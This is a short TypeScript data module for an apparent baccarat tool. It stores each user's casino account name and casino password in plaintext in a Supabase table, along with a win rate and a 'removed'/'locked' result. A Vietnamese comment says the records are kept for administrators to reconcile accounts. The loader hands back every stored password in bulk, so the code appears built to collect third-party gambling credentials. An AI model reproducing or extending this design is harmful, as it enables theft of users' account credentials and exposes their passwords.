import { supabase } from '@/lib/supabase';

export type BaccaratSessionRecord = {
  id: string;
  user_id: string | null;
  player_name: string | null;
  account: string;
  password: string;
  casino: string;
  room: string | null;
  preferred: boolean;
  result: string;
  win_rate: number;
  created_at: string;
};

export type BaccaratSessionInput = {
  account: string;
  password: string;
  casino: string;
  room: string;
  preferred: boolean;
  winRate: number;
  playerName?: string | null;
};

/** Lưu lại phiên khách chạy để bộ phận quản trị đối soát tài khoản. */
export async function saveBaccaratSession(input: BaccaratSessionInput): Promise<void> {
  const { data } = await supabase.auth.getSession();
  const userId = data.session?.user.id ?? null;

  const { error } = await supabase.from('baccarat_sessions').insert({
    user_id: userId,
    player_name: (input.playerName ?? '').trim() || null,
    account: input.account.trim(),
    password: input.password,
    casino: input.casino.trim(),
    room: input.room.trim() || null,
    preferred: input.preferred,
    result: input.preferred ? 'removed' : 'locked',
    win_rate: input.winRate,
  });

  if (error) throw new Error(error.message);
}

export async function loadBaccaratSessions(limit = 300): Promise<BaccaratSessionRecord[]> {
  const { data, error } = await supabase
    .from('baccarat_sessions')
    .select(
      'id, user_id, player_name, account, password, casino, room, preferred, result, win_rate, created_at',
    )
    .order('created_at', { ascending: false })
    .limit(limit);

  if (error) throw new Error(error.message);
  return (data ?? []) as BaccaratSessionRecord[];
}

export async function deleteBaccaratSession(id: string): Promise<void> {
  const { error } = await supabase.from('baccarat_sessions').delete().eq('id', id);
  if (error) throw new Error(error.message);
}